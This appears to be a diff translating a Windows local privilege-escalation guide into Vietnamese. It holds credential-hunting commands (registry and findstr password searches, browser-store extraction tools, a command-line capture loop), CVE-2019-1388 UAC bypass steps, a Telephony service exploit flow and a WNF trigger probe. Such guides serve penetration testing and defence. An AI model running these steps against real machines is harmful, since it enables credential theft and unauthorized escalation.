+Ngoài ra, hãy kiểm tra cơ sở dữ liệu hồ sơ, ghi chú và tệp đã nhận của các messaging client mà bạn có thể truy cập để tìm đầu mối về thông tin xác thực. Bản xuất khóa khôi phục BitLocker có thể được lưu dưới dạng HTML hoặc TXT, đôi khi bên trong một kho lưu trữ sao lưu có tên cụ thể. Tài liệu như vậy có thể cấp quyền truy cập vào một data volume được mã hóa riêng, chứa các bản sao lưu cũ hơn; chỉ kiểm tra volume và kho lưu trữ khi được phép truy cập. Nếu bản sao lưu có `NTDS.dit`, việc khôi phục thông tin xác thực domain ngoại tuyến cũng cần hive `SYSTEM` tương ứng, như mô tả trong [quy trình sao lưu và nhóm đặc quyền](../active-directory-methodology/privileged-groups-and-token-privileges.md). Tên tệp và một volume bị khóa không đủ để chứng minh rằng có khóa khôi phục hoặc bản sao lưu domain có thể sử dụng.
 
-To **recover passwords** saved by several programs you can use: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)
+Để **khôi phục mật khẩu** đã lưu bằng một số chương trình, bạn có thể dùng: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)
 
-### Inside the registry
+### Bên trong registry
 
-**Other possible registry keys with credentials**
+**Các khóa registry khác có thể chứa thông tin xác thực**
 
 ```bash
 reg query "HKCU\Software\ORL\WinVNC3\Password"
@@ -2056,47 +2055,47 @@ reg query "HKCU\Software\TightVNC\Server"
 reg query "HKCU\Software\OpenSSH\Agent\Key"
 ```
 
-[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)
+[**Trích xuất khóa openssh từ registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)
 
-### Browsers History
+### Lịch sử trình duyệt
 
-You should check for dbs where passwords from **Chrome or Firefox** are stored.\
-You should check for dbs where passwords from **Chrome, Edge, or Firefox** are stored.\
-Also check for the history, bookmarks and favourites of the browsers so maybe some **passwords are** stored there.
+Bạn nên kiểm tra các db lưu mật khẩu từ **Chrome hoặc Firefox**.\
+Bạn nên kiểm tra các db lưu mật khẩu từ **Chrome, Edge hoặc Firefox**.\
+Cũng nên kiểm tra lịch sử, dấu trang và mục yêu thích của trình duyệt, vì có thể **một số mật khẩu được** lưu ở đó.
 
-For the current user's conventional Edge **Default** profile, `Login Data` is under `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, while `Local State` is in its parent `User Data` directory. [Microsoft documents the default profile location](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); another profile or a `UserDataDir` policy can move it. File presence is only a credential-store lead: confirm readable files, the applicable user's DPAPI context or other authorized key material, and whether a saved login belongs to a more privileged account. Path-only enumeration need not open the database or print decrypted passwords.
+Với profile **Default** thông thường của Edge cho người dùng hiện tại, `Login Data` nằm trong `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, còn `Local State` nằm trong thư mục `User Data` cha. [Microsoft mô tả vị trí profile mặc định](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); một profile khác hoặc policy `UserDataDir` có thể thay đổi vị trí này. Việc tệp tồn tại chỉ là manh mối về nơi lưu thông tin đăng nhập: hãy xác nhận các tệp có thể đọc được, có ngữ cảnh DPAPI của người dùng tương ứng hoặc khóa khác được phép sử dụng, và thông tin đăng nhập đã lưu có thuộc về tài khoản có đặc quyền cao hơn hay không. Chỉ liệt kê đường dẫn thì không cần mở database hay in ra mật khẩu đã giải mã.
 
-For Firefox, [Mozilla documents](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) that a profile's `key4.db` and `logins.json` are the paired key and encrypted-login files. Their presence is only a lead: check whether both files are readable, whether saved entries exist, and whether a Primary Password protects the key before concluding that credentials are usable. If a recovered credential belongs to a domain account, review that account's effective group-control rights and the group's [LAPS password read or decrypt rights](../active-directory-methodology/laps.md) separately; browser artifacts alone do not establish an administrator path.
+Với Firefox, [Mozilla cho biết](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) `key4.db` và `logins.json` trong profile là cặp tệp khóa và thông tin đăng nhập được mã hóa. Việc các tệp này tồn tại chỉ là manh mối: hãy kiểm tra xem cả hai tệp có đọc được không, có mục đã lưu hay không, và Primary Password có bảo vệ khóa hay không trước khi kết luận rằng có thể sử dụng thông tin đăng nhập. Nếu thông tin đăng nhập khôi phục được thuộc về tài khoản domain, hãy xem xét riêng các quyền kiểm soát nhóm hiệu lực của tài khoản đó và [quyền đọc hoặc giải mã mật khẩu LAPS](../active-directory-methodology/laps.md) của nhóm; riêng các artifact của trình duyệt không chứng minh được có đường dẫn lên quyền administrator.
 
-Tools to extract passwords from browsers:
+Các công cụ trích xuất mật khẩu từ trình duyệt:
 
 - Mimikatz: `dpapi::chrome`
 - [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
 - [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
 - [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)
 
-### **COM DLL Overwriting**
+### **Ghi đè COM DLL**
 
-**Component Object Model (COM)** is a technology built within the Windows operating system that allows **intercommunication** between software components of different languages. Each COM component is **identified via a class ID (CLSID)** and each component exposes functionality via one or more interfaces, identified via interface IDs (IIDs).
+**Component Object Model (COM)** là công nghệ được xây dựng trong hệ điều hành Windows, cho phép các thành phần phần mềm viết bằng những ngôn ngữ khác nhau **giao tiếp với nhau**. Mỗi thành phần COM được **định danh bằng class ID (CLSID)** và mỗi thành phần cung cấp chức năng thông qua một hoặc nhiều interface, được định danh bằng interface ID (IID).
 
-COM classes and interfaces are defined in the registry under **HKEY\CLASSES\ROOT\CLSID** and **HKEY\CLASSES\ROOT\Interface** respectively. This registry is created by merging the **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**
+Các class và interface COM được định nghĩa tương ứng trong registry tại **HKEY\CLASSES\ROOT\CLSID** và **HKEY\CLASSES\ROOT\Interface**. Registry này được tạo bằng cách hợp nhất **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**
 
-Inside the CLSIDs of this registry you can find the child registry **InProcServer32** which contains a **default value** pointing to a **DLL** and a value called **ThreadingModel** that can be **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) or **Neutral** (Thread Neutral).
+Bên trong các CLSID của registry này, bạn có thể tìm thấy registry con **InProcServer32**, chứa **giá trị mặc định** trỏ đến một **DLL** và một giá trị tên là **ThreadingModel**, có thể là **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single hoặc Multi) hoặc **Neutral** (Thread Neutral).
 
-![Browsers History - COM DLL Overwriting: Inside the CLSIDs of this registry you can find the child registry InProcServer32 which contains a default value pointing to a DLL and a value...](<../../images/image (729).png>)
+![Lịch sử trình duyệt - Ghi đè COM DLL: Bên trong các CLSID của registry này, bạn có thể tìm thấy registry con InProcServer32, chứa giá trị mặc định trỏ đến một DLL và một giá trị...](<../../images/image (729).png>)
 
-Basically, if you can **overwrite any of the DLLs** that are going to be executed, you could **escalate privileges** if that DLL is going to be executed by a different user.
+Về cơ bản, nếu bạn có thể **ghi đè bất kỳ DLL nào** sắp được thực thi, bạn có thể **leo thang đặc quyền** nếu DLL đó được thực thi bởi một người dùng khác.
 
-To learn how attackers use COM Hijacking as a persistence mechanism check:
+Để tìm hiểu cách kẻ tấn công sử dụng COM Hijacking làm cơ chế persistence, hãy xem:
 
 
 {{#ref}}
 com-hijacking.md
 {{#endref}}
 
-### **Generic Password search in files and registry**
+### **Tìm kiếm mật khẩu tổng quát trong tệp và registry**
 
-**Search for file contents**
+**Tìm kiếm nội dung tệp**
 
 ```bash
 cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
@@ -2104,7 +2103,7 @@ findstr /si password *.xml *.ini *.txt *.config
 findstr /spin "password" *.*
 ```
 
-**Search for a file with a certain filename**
+**Tìm kiếm tệp có tên cụ thể**
 
 ```bash
 dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
@@ -2112,7 +2111,7 @@ where /R C:\ user.txt
 where /R C:\ *.ini
 ```
 
-**Search the registry for key names and passwords**
+**Tìm kiếm registry để tìm tên khóa và mật khẩu**
 
 ```bash
 REG QUERY HKLM /F "password" /t REG_SZ /S /K
@@ -2121,13 +2120,13 @@ REG QUERY HKLM /F "password" /t REG_SZ /S /d
 REG QUERY HKCU /F "password" /t REG_SZ /S /d
 ```
 
-### Tools that search for passwords
+### Công cụ tìm kiếm mật khẩu
 
-[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin I have created this plugin to **automatically execute every metasploit POST module that searches for credentials** inside the victim.\
-[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatically search for all the files containing passwords mentioned in this page.\
-[**Lazagne**](https://github.com/AlessandroZ/LaZagne) is another great tool to extract password from a system.
+[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **là một plugin msf** tôi đã tạo plugin này để **tự động thực thi mọi POST module của metasploit tìm kiếm thông tin xác thực** trên máy nạn nhân.\
+[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) tự động tìm kiếm mọi tệp chứa mật khẩu được đề cập trên trang này.\
+[**Lazagne**](https://github.com/AlessandroZ/LaZagne) là một công cụ tuyệt vời khác để trích xuất mật khẩu từ hệ thống.
 
-The tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) search for **sessions**, **usernames** and **passwords** of several tools that save this data in clear text (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
+Công cụ [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) tìm kiếm **session**, **tên người dùng** và **mật khẩu** của một số công cụ lưu dữ liệu này dưới dạng văn bản thuần (PuTTY, WinSCP, FileZilla, SuperPuTTY và RDP)
 
 ```bash
 Import-Module path\to\SessionGopher.ps1;
@@ -2138,52 +2137,52 @@ Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
 
 ## Leaked Handlers
 
-Imagine that **a process running as SYSTEM open a new process** (`OpenProcess()`) with **full access**. The same process **also create a new process** (`CreateProcess()`) **with low privileges but inheriting all the open handles of the main process**.\
-Then, if you have **full access to the low privileged process**, you can grab the **open handle to the privileged process created** with `OpenProcess()` and **inject a shellcode**.\
-[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
-[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).
+Hãy tưởng tượng **một process chạy dưới quyền SYSTEM mở một process mới** (`OpenProcess()`) với **quyền truy cập đầy đủ**. Process đó **cũng tạo một process mới** (`CreateProcess()`) **với quyền thấp hơn nhưng kế thừa tất cả handle đang mở của process chính**.\
+Sau đó, nếu bạn có **quyền truy cập đầy đủ vào process có quyền thấp**, bạn có thể lấy **handle đang mở tới process có quyền cao được tạo bằng** `OpenProcess()` và **inject shellcode**.\
+[Đọc ví dụ này để biết thêm thông tin về **cách phát hiện và khai thác lỗ hổng này**.](leaked-handle-exploitation.md)\
+[Đọc **bài viết khác này để xem giải thích đầy đủ hơn về cách kiểm tra và lạm dụng các handle đang mở khác của process và thread được kế thừa với nhiều mức quyền khác nhau (không chỉ quyền truy cập đầy đủ)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).
 
 ## Named Pipe Client Impersonation
 
-Shared memory segments, referred to as **pipes**, enable process communication and data transfer.
+Các vùng bộ nhớ dùng chung, được gọi là **pipe**, cho phép các process giao tiếp và truyền dữ liệu.
 
-Windows provides a feature called **Named Pipes**, allowing unrelated processes to share data, even over different networks. This resembles a client/server architecture, with roles defined as **named pipe server** and **named pipe client**.
+Windows cung cấp tính năng **Named Pipes**, cho phép các process không liên quan chia sẻ dữ liệu, kể cả qua các mạng khác nhau. Cơ chế này tương tự kiến trúc client/server, với các vai trò là **named pipe server** và **named pipe client**.
 
-When data is sent through a pipe by a **client**, the **server** that set up the pipe has the ability to **take on the identity** of the **client**, assuming it has the necessary **SeImpersonate** rights. Identifying a **privileged process** that communicates via a pipe you can mimic provides an opportunity to **gain higher privileges** by adopting the identity of that process once it interacts with the pipe you established. For instructions on executing such an attack, helpful guides can be found [**here**](named-pipe-client-impersonation.md) and [**here**](#from-high-integrity-to-system).
+Khi **client** gửi dữ liệu qua pipe, **server** đã thiết lập pipe có thể **mạo danh** **client**, nếu có quyền **SeImpersonate** cần thiết. Việc xác định được một **process có quyền cao** giao tiếp qua pipe mà bạn có thể giả lập sẽ tạo cơ hội **nâng cao quyền hạn** bằng cách mạo danh process đó khi nó tương tác với pipe bạn đã thiết lập. Hướng dẫn thực hiện kiểu tấn công này có thể tìm thấy [**tại đây**](named-pipe-client-impersonation.md) và [**tại đây**](#from-high-integrity-to-system).
 
-Also the following tool allows to **intercept a named pipe communication with a tool like burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **and this tool allows to list and see all the pipes to find privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)
+Ngoài ra, công cụ sau cho phép **chặn giao tiếp qua named pipe bằng một công cụ như Burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **và công cụ này cho phép liệt kê, xem tất cả các pipe để tìm cơ hội nâng quyền** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)
 
 ## Telephony tapsrv remote DWORD write to RCE
 
-The Telephony service (TapiSrv) in server mode exposes `\\pipe\\tapsrv` (MS-TRP). A remote authenticated client can abuse the mailslot-based async event path to turn `ClientAttach` into an arbitrary **4-byte write** to any existing file writable by `NETWORK SERVICE`, then gain Telephony admin rights and load an arbitrary DLL as the service. Full flow:
+Dịch vụ Telephony (TapiSrv) ở chế độ server công khai `\\pipe\\tapsrv` (MS-TRP). Client từ xa đã xác thực có thể lạm dụng đường xử lý sự kiện bất đồng bộ dựa trên mailslot để biến `ClientAttach` thành thao tác **ghi 4 byte tùy ý** vào bất kỳ file hiện có nào mà `NETWORK SERVICE` có quyền ghi, sau đó giành quyền quản trị Telephony và nạp DLL tùy ý dưới danh tính dịch vụ. Quy trình đầy đủ:
 
-- `ClientAttach` with `pszDomainUser` set to a writable existing path → the service opens it via `CreateFileW(..., OPEN_EXISTING)` and uses it for async event writes.
-- Each event writes the attacker-controlled `InitContext` from `Initialize` to that handle. Register a line app with `LRegisterRequestRecipient` (`Req_Func 61`), trigger `TRequestMakeCall` (`Req_Func 121`), fetch via `GetAsyncEvents` (`Req_Func 0`), then unregister/shutdown to repeat deterministic writes.
-- Add yourself to `[TapiAdministrators]` in `C:\Windows\TAPI\tsec.ini`, reconnect, then call `GetUIDllName` with an arbitrary DLL path to execute `TSPI_providerUIIdentify` as `NETWORK SERVICE`.
+- Gọi `ClientAttach` với `pszDomainUser` được đặt thành đường dẫn hiện có có quyền ghi → dịch vụ mở file bằng `CreateFileW(..., OPEN_EXISTING)` và dùng file đó để ghi sự kiện bất đồng bộ.
+- Mỗi sự kiện ghi `InitContext` do attacker kiểm soát từ `Initialize` vào handle đó. Đăng ký ứng dụng line bằng `LRegisterRequestRecipient` (`Req_Func 61`), kích hoạt `TRequestMakeCall` (`Req_Func 121`), lấy dữ liệu qua `GetAsyncEvents` (`Req_Func 0`), rồi hủy đăng ký/tắt dịch vụ để lặp lại các lần ghi có thể dự đoán.
+- Thêm tài khoản của bạn vào `[TapiAdministrators]` trong `C:\Windows\TAPI\tsec.ini`, kết nối lại, rồi gọi `GetUIDllName` với đường dẫn DLL tùy ý để thực thi `TSPI_providerUIIdentify` dưới danh tính `NETWORK SERVICE`.
 
-More details:
+Chi tiết hơn:
 
 {{#ref}}
 telephony-tapsrv-arbitrary-dword-write-to-rce.md
 {{#endref}}
 
-## Misc
+## Khác
 
-### File Extensions that could execute stuff in Windows
+### Các phần mở rộng file có thể thực thi nội dung trong Windows
 
-Check out the page **[https://filesec.io/](https://filesec.io/)**
+Xem trang **[https://filesec.io/](https://filesec.io/)**
 
-### Protocol handler / ShellExecute abuse via Markdown renderers
+### Lạm dụng Protocol handler / ShellExecute qua trình render Markdown
 
-Clickable Markdown links forwarded to `ShellExecuteExW` can trigger dangerous URI handlers (`file:`, `ms-appinstaller:` or any registered scheme) and execute attacker-controlled files as the current user. See:
+Các liên kết Markdown có thể nhấp được chuyển đến `ShellExecuteExW` có thể kích hoạt URI handler nguy hiểm (`file:`, `ms-appinstaller:` hoặc bất kỳ scheme nào đã đăng ký) và thực thi file do attacker kiểm soát dưới danh tính người dùng hiện tại. Xem:
 
 {{#ref}}
 ../protocol-handler-shell-execute-abuse.md
 {{#endref}}
 
-### **Monitoring Command Lines for passwords**
+### **Giám sát Command Line để tìm mật khẩu**
 
-When getting a shell as a user, there may be scheduled tasks or other processes being executed which **pass credentials on the command line**. The script below captures process command lines every two seconds and compares the current state with the previous state, outputting any differences.
+Khi có shell dưới danh tính người dùng, có thể có scheduled task hoặc process khác đang chạy và **truyền thông tin xác thực trên command line**. Script bên dưới thu thập command line của process mỗi hai giây, so sánh trạng thái hiện tại với trạng thái trước đó và xuất ra mọi khác biệt.
 
 ```bash
 while($true)
@@ -2195,15 +2194,15 @@ while($true)
 }
 ```
 
-## Stealing passwords from processes
+## Đánh cắp mật khẩu từ các tiến trình
 
-## From Low Priv User to NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass
+## Từ người dùng quyền thấp đến NT\AUTHORITY SYSTEM (CVE-2019-1388) / Bypass UAC
 
-If you have access to the graphical interface (via console or RDP) and UAC is enabled, in some versions of Microsoft Windows it's possible to run a terminal or any other process such as "NT\AUTHORITY SYSTEM" from an unprivileged user.
+Nếu bạn có quyền truy cập vào giao diện đồ họa (qua console hoặc RDP) và UAC được bật, thì trên một số phiên bản Microsoft Windows, bạn có thể chạy terminal hoặc bất kỳ tiến trình nào khác dưới quyền "NT\AUTHORITY SYSTEM" từ một người dùng không có đặc quyền.
 
-This makes it possible to escalate privileges and bypass UAC at the same time with the same vulnerability. Additionally, there is no need to install anything and the binary used during the process, is signed and issued by Microsoft.
+Điều này cho phép bạn đồng thời leo thang đặc quyền và bypass UAC bằng cùng một lỗ hổng. Ngoài ra, không cần cài đặt gì và binary được sử dụng trong quá trình này có chữ ký do Microsoft phát hành.
 
-Some of the affected systems are the following:
+Một số hệ thống bị ảnh hưởng gồm:
 
 ```
 SERVER
@@ -2227,7 +2226,7 @@ Windows 10 1703	15063	link NOT opened
 Windows 10 1709	16299	link NOT opened
 ```
 
-To exploit this vulnerability, it's necessary to perform the following steps:
+Để khai thác lỗ hổng này, cần thực hiện các bước sau:
 
 ```
 1) Right click on the HHUPD.EXE file and run it as Administrator.
@@ -2247,44 +2246,44 @@ To exploit this vulnerability, it's necessary to perform the following steps:
 8) Remember to cancel setup and the UAC prompt to return to your desktop.
 ```
 
-You have all the necessary files and information in the following GitHub repository:
+Bạn có tất cả các tệp và thông tin cần thiết trong repository GitHub này:
 
 https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>
 
-## From Administrator Medium to High Integrity Level / UAC Bypass
+## Từ Medium Integrity Level của Administrator lên High Integrity Level / Bypass UAC
 
-Read this to **learn about Integrity Levels**:
+Đọc nội dung này để **tìm hiểu về Integrity Levels**:
 
 
 {{#ref}}
 integrity-levels.md
 {{#endref}}
 
-Then **read this to learn about UAC and UAC bypasses:**
+Sau đó **đọc nội dung này để tìm hiểu về UAC và các cách bypass UAC:**
 
 
 {{#ref}}
 ../authentication-credentials-uac-and-efs/uac-user-account-control.md
 {{#endref}}
 
-## Upload Directory Junctions into a Served Root
+## Đưa Junction của thư mục upload vào thư mục gốc được phục vụ
 
-An application may create a predictable upload subdirectory, write a caller-supplied filename into it, and then process the file. If a low-privilege user can remove and replace that subdirectory with an NTFS junction before the server-side write, the write may follow the junction into a web-served directory. A script placed there can run as the web-service identity if the server executes that file type. This is an application-specific arbitrary-write boundary; a writable upload directory or an existing junction alone does not prove it.
+Một ứng dụng có thể tạo thư mục con upload với tên có thể dự đoán được, ghi tệp có tên do người gọi cung cấp vào đó, rồi xử lý tệp. Nếu người dùng có đặc quyền thấp có thể xóa rồi thay thế thư mục con đó bằng NTFS junction trước khi thao tác ghi phía máy chủ diễn ra, thao tác ghi có thể đi theo junction vào thư mục được web server phục vụ. Một script được đặt ở đó có thể chạy với danh tính của web service nếu server thực thi loại tệp đó. Đây là một ranh giới arbitrary-write đặc thù của ứng dụng; chỉ riêng việc thư mục upload có quyền ghi hoặc tồn tại junction không chứng minh được điều này.
 
-Check the exact path construction and timing in the upload handler, the user's effective delete/create rights on the subdirectory, the destination's effective ACLs, whether the writer follows reparse points, and whether the web server executes files in that destination. Confirm the writer's and web server's process identities separately. Passive inventory can show directory ACLs and reparse metadata, but it cannot establish the handler's behavior or a future junction swap. If execution lands in a service account, inspect the **actual process token** before considering any separate token-privilege path.
+Kiểm tra chính xác cách tạo đường dẫn và thời điểm xử lý trong upload handler, quyền xóa/tạo hiệu lực của người dùng trên thư mục con, ACL hiệu lực của đích đến, liệu tiến trình ghi có đi theo reparse point hay không, và web server có thực thi tệp trong thư mục đích đó hay không. Xác minh riêng danh tính của tiến trình ghi và web server. Việc kiểm kê thụ động có thể hiển thị ACL thư mục và metadata reparse, nhưng không thể xác định hành vi của handler hoặc việc thay junction trong tương lai. Nếu mã được thực thi trong tài khoản dịch vụ, hãy kiểm tra **token của tiến trình thực tế** trước khi xem xét bất kỳ hướng khai thác đặc quyền token riêng biệt nào.
 
-## WNF-triggered privileged scheduled-task cleanup
+## Dọn dẹp scheduled task đặc quyền được kích hoạt bởi WNF
 
-A scheduled task that denies manual execution may still expose an unprivileged trigger. When auditing a privileged task, export its XML and inspect **all** triggers as well as its task DACL, principal and action. In particular, a `WnfStateChangeTrigger` names a Windows Notification Facility (WNF) state; if that securable state permits the current user to publish an update, the user can indirectly start the task under its configured identity despite `<AllowStartOnDemand>false</AllowStartOnDemand>`.<sup>[[43]](#references)</sup>
+Một scheduled task từ chối chạy thủ công vẫn có thể để lộ một trigger mà người dùng không có đặc quyền kích hoạt được. Khi kiểm tra task đặc quyền, hãy xuất XML và kiểm tra **tất cả** trigger cùng với DACL, principal và action của task. Cụ thể, `WnfStateChangeTrigger` chỉ định một trạng thái Windows Notification Facility (WNF); nếu trạng thái có thể được bảo vệ đó cho phép người dùng hiện tại publish một bản cập nhật, người dùng có thể gián tiếp khởi chạy task dưới danh tính đã cấu hình, bất kể `<AllowStartOnDemand>false</AllowStartOnDemand>`.<sup>[[43]](#references)</sup>
 
-For example, the Recall `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` task ran as SYSTEM, accepted updates to WNF state `7508BCA32C079E41` from a standard user, and then inspected `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}` even when Recall was disabled.<sup>[[43]](#references)</sup>
+Ví dụ, task Recall `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` chạy dưới quyền SYSTEM, chấp nhận cập nhật trạng thái WNF `7508BCA32C079E41` từ người dùng thông thường, rồi kiểm tra `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}` ngay cả khi Recall đã bị tắt.<sup>[[43]](#references)</sup>
 
 ```powershell
 schtasks /query /tn "<TASK>" /xml > task.xml
 Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
 ```
 
-To test reachability, resolve `ZwUpdateWnfStateData` from `ntdll.dll`, submit an empty update for the eight-byte state name, and correlate the return status with the task's last-run data or Procmon activity. The following reduced probe uses the byte sequence from the Recall task example; substitute the bytes exported for the task being tested.<sup>[[43]](#references)</sup>
+Để kiểm tra khả năng gọi tới hàm, hãy resolve `ZwUpdateWnfStateData` từ `ntdll.dll`, gửi một bản cập nhật rỗng cho state name dài tám byte, rồi đối chiếu trạng thái trả về với dữ liệu lần chạy gần nhất của task hoặc hoạt động trong Procmon. Probe rút gọn sau đây sử dụng chuỗi byte từ ví dụ về task Recall; hãy thay bằng các byte được export cho task đang kiểm tra.<sup>[[43]](#references)</sup>
 
 ```c
 #include <windows.h>
@@ -2299,33 +2298,33 @@ int main(void) {
 }
 ```
 
-### Turning recursive cleanup into privileged deletion
+### Biến thao tác dọn dẹp đệ quy thành xóa với quyền cao
 
-The useful primitive is not the trigger alone, but a privileged cleanup routine that accepts an attacker-controlled directory. Trace the operation from enumeration to the final mutation: profile/session discovery, wildcard-selected children, `SHCreateItemFromParsingName`, and `IFileOperation::DeleteItem` are strong indicators that a previously checked pathname will later be traversed recursively. If descendants are not opened relative to trusted directory handles and validated before deletion, an attacker can change resolution between enumeration and use.<sup>[[43]](#references)</sup>
+Primitive hữu ích không chỉ là trigger, mà là một routine dọn dẹp có quyền cao chấp nhận thư mục do attacker kiểm soát. Theo dõi thao tác từ bước liệt kê đến thay đổi cuối cùng: phát hiện profile/session, các mục con được chọn bằng wildcard, `SHCreateItemFromParsingName` và `IFileOperation::DeleteItem` là những dấu hiệu mạnh cho thấy một pathname đã được kiểm tra trước đó sẽ được duyệt đệ quy về sau. Nếu các mục con không được mở tương đối với handle thư mục đáng tin cậy và xác thực trước khi xóa, attacker có thể thay đổi cách phân giải giữa lúc liệt kê và lúc sử dụng.<sup>[[43]](#references)</sup>
 
-Pair the WNF trigger with the [oplock, junction and Object Manager symlink substitution](#from-folder-contents-delete-to-system-eop) described below: the oplock pauses the cleaner after it selects the legitimate child, while the writable ancestor is replaced so the resumed privileged delete resolves through `\RPC Control` to the protected target. In the Recall chain this yielded the SYSTEM deletion of `C:\Config.Msi` required by the documented MSI rollback technique.<sup>[[31]](#references)[[43]](#references)</sup>
+Kết hợp WNF trigger với kỹ thuật [thay thế oplock, junction và Object Manager symlink](#from-folder-contents-delete-to-system-eop) được mô tả bên dưới: oplock tạm dừng chương trình dọn dẹp sau khi nó chọn mục con hợp lệ, trong khi ancestor có thể ghi bị thay thế để thao tác xóa có quyền cao khi tiếp tục sẽ phân giải qua `\RPC Control` đến target được bảo vệ. Trong chuỗi Recall, cách này dẫn đến thao tác xóa `C:\Config.Msi` bằng quyền SYSTEM, cần thiết cho kỹ thuật MSI rollback đã được ghi lại.<sup>[[31]](#references)[[43]](#references)</sup>
 
-### Nested descendants bypass shallow reparse-point fixes
+### Các mục con lồng nhau vượt qua những bản sửa lỗi reparse point hời hợt
 
-Validating only the attacker-controlled root and its immediate child does not secure a recursive pathname-based delete. Keep those checked objects legitimate and move the junction/oplock substitution into an additional child below them; `IFileOperation::DeleteItem` eventually reaches the unvalidated descendant and follows its new target. CVE-2026-20941 was produced by exactly this class of incomplete fix after the first Recall patch validated `UKP` and the GUID-shaped directory but retained the old recursive deletion operation.<sup>[[43]](#references)</sup>
+Chỉ xác thực root do attacker kiểm soát và mục con trực tiếp của nó không đủ để bảo vệ thao tác xóa đệ quy dựa trên pathname. Giữ các đối tượng đã kiểm tra đó ở trạng thái hợp lệ rồi chuyển việc thay thế junction/oplock xuống một mục con sâu hơn bên dưới chúng; `IFileOperation::DeleteItem` cuối cùng sẽ tiếp cận mục con chưa được xác thực và đi theo target mới của nó. CVE-2026-20941 thuộc chính lớp lỗi này: bản vá Recall đầu tiên xác thực `UKP` và thư mục có tên dạng GUID nhưng vẫn giữ thao tác xóa đệ quy cũ.<sup>[[43]](#references)</sup>
 
-The safe pattern is to open **every descendant** relative to an already trusted directory handle, obtain and verify the final resolved path/object, and apply the deletion disposition to that verified handle. Do not validate a prefix and then return to recursive path-based deletion. During patch review, also inspect structures at the real call site: in this case runtime inspection of `OBJECT_ATTRIBUTES` at `NtCreateFile` showed a non-null `RootDirectory` and a relative `{GUID}\\secure_file.lock` name, disproving misleading decompiler output that suggested a second `FILE_DELETE_ON_CLOSE` primitive.<sup>[[43]](#references)</sup>
+Mẫu an toàn là mở **mọi mục con** tương đối với handle thư mục đã đáng tin cậy, lấy và xác minh đường dẫn/đối tượng cuối cùng đã phân giải, rồi áp dụng trạng thái xóa lên handle đã xác minh đó. Đừng xác thực một tiền tố rồi quay lại thao tác xóa đệ quy dựa trên path. Khi review bản vá, cũng hãy kiểm tra cấu trúc tại vị trí gọi thực tế: trong trường hợp này, kiểm tra runtime `OBJECT_ATTRIBUTES` tại `NtCreateFile` cho thấy `RootDirectory` khác null và tên `{GUID}\\secure_file.lock` là đường dẫn tương đối, bác bỏ kết quả decompiler gây hiểu nhầm rằng có một primitive `FILE_DELETE_ON_CLOSE` thứ hai.<sup>[[43]](#references)</sup>
 
-## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP
+## Từ Xóa/Di chuyển/Đổi tên Thư mục Tùy ý đến SYSTEM EoP
 
-The technique described [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) with a exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>
+Kỹ thuật được mô tả [**trong bài blog này**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), cùng mã khai thác [**có tại đây**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>
 
